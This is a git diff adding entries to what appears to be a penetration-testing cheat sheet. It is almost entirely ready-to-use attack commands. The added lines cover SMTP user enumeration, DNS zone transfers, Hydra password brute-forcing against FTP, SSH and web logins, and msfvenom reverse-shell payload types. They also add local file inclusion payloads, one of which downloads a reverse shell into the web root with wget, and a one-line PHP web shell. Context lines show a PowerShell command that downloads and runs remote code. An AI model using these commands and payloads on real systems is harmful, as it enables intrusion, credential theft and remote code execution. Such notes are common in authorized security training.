@@ -26,6 +26,14 @@ nc -w <ip> 22
 ```
 nc -w <ip> 25
 telnet <ip> 25
+* VRFY <user>
+```
+* Port 53
+```
+nslookup
+*server <ip>
+*<ip>
+dig axfr <domain_name> @<ip> 
 ```
 * Port 110 POP3
 ```
@@ -77,6 +85,12 @@ ssh <username@ip>
   ```
   gpp-decrypt <code>
   ```
+  * Hydra
+  ```
+  hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV <ip> ftp
+  hydra -v -V -u -L users.txt -P /usr/share/wordlists/rockyou.txt -t 1 -u <ip> ssh
+  hydra -l admin -P /usr/share/wordlists/rockyou.txt <ip> -V http-form-post "/login.php:<request>:<wrong_message>''"
+  ```
 * Send a file using netcat
   * send    
   ```
@@ -101,3 +115,31 @@ ssh <username@ip>
  powershell -c CreateObject("WScript.Shell").Exec("cmd /c powershell IEX(New-Object Net.WebClient).DownloadString('http://<LHOSTIP>/<filename>')")
  powershell -c "Invoke-WebRequest -Uri <LHOSTIP>/<filename> -Outfile <Location\filename>"
  ```
+ * Msfvenom
+ ```
+ windows/shell/reverse_tcp 
+ windows/x64/shell/reverse_tcp
+ ------------------------------->exe,asp,aspx
+ linux/x86/shell/reverse_tcp
+ linux/x64/shell/reverse_tcp
+ ------------------------------->elf
+ java/jsp_shell_reverse_tcp > war,jsp
+ php/reverse_php > php
+ ```
+* LFI
+```
+/etc/passwd
+/etc/passwd%00 # null byte terminate
+../../../../../../etc/passwd%00 # directory traversal
+php://filter/convert.base64-encode/resource=/etc/php5/apache2/php.ini%00 
+expect://whoami # expect wrapper, direct code execution, not enabled by default
+php://input # php code execution, send php code in POST data `<? system('wget http://192.168.183.129/php-reverse-shell.php -O /var/www/shell.php');?>`
+/proc/self/environ # if readable, write php code in "User Agent" data, and it'll appear within environ
+/proc/self/fd/0 # if readable, write php code in "referer" data, and it'll appear within file descriptor. make sure to brute force the fd number 0-10+
+/var/lib/php/session s
+/tmp/ 
+```
+* RFI
+```
+<?php echo shell_exec($_GET['cmd']);?>
+```
